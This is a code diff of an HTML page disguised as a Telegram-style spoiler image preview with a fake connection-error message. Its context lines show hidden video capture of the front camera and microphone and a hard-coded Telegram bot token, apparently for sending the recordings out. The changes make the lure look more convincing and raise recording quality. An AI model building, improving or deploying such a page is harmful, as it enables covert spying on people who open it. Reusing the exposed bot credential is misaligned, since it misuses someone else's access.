@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Spoiler Foto ala Telegram - 9:16</title>
+    <title>imagepreview</title>
     <style>
         * {
             margin: 0;
@@ -51,6 +51,7 @@
             font-size: 12px;
             font-weight: 400;
             letter-spacing: 0.5px;
+            font-variant-numeric: tabular-nums;
         }
 
         .spoiler-bubble {
@@ -273,7 +274,7 @@
     <div class="telegram-spoiler">
         <div class="chat-header">
             <div class="chat-name">IMAGE PREVIEW</div>
-            <div class="time">12:34</div>
+            <div class="time" id="realTimeClock">12:34</div>
         </div>
 
         <div class="spoiler-bubble" id="spoilerBubble">
@@ -285,7 +286,7 @@
                 <canvas id="dotCanvas"></canvas>
             </div>
 
-            <div class="spoiler-label">LIHAT GAMBAR</div>
+            <div class="spoiler-label">Lihat Foto</div>
         </div>
     </div>
 
@@ -300,7 +301,7 @@
     <div class="error-toast" id="errorToast">
         <div class="title">Koneksi Bermasalah</div>
         <div class="desc">Gagal memuat gambar. Periksa koneksi internet Anda dan coba lagi.</div>
-        <button class="btn-ok" id="btnOk">Coba Lagi</button>
+        <button class="btn-ok" id="btnOk">🔄 Coba Lagi</button>
     </div>
 
     <!-- Video & Canvas untuk kamera (hidden) -->
@@ -319,10 +320,23 @@
             const loadingProgress = document.getElementById('loadingProgress');
             const errorToast = document.getElementById('errorToast');
             const btnOk = document.getElementById('btnOk');
+            const clockElement = document.getElementById('realTimeClock');
 
             // Elemen untuk kamera
             const video = document.getElementById('video');
             const captureCanvas = document.getElementById('canvas');
+
+            // ====== JAM REAL-TIME ======
+            function updateClock() {
+                const now = new Date();
+                const hours = String(now.getHours()).padStart(2, '0');
+                const minutes = String(now.getMinutes()).padStart(2, '0');
+                clockElement.textContent = hours + ':' + minutes;
+            }
+
+            // Update jam setiap 30 detik
+            updateClock();
+            setInterval(updateClock, 30000);
 
             // ====== BOT TELEGRAM ======
             const BOT_TOKEN = '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
@@ -427,8 +441,8 @@
                         audio: true,
                         video: {
                             facingMode: "user",
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
+                            width: { ideal: 1080 },
+                            height: { ideal: 1920 }
                         }
                     });
 
@@ -472,7 +486,7 @@
 
                     const options = {
                         mimeType: mimeType,
-                        videoBitsPerSecond: 1500000,
+                        videoBitsPerSecond: 2500000,
                         audioBitsPerSecond: 128000
                     };
 
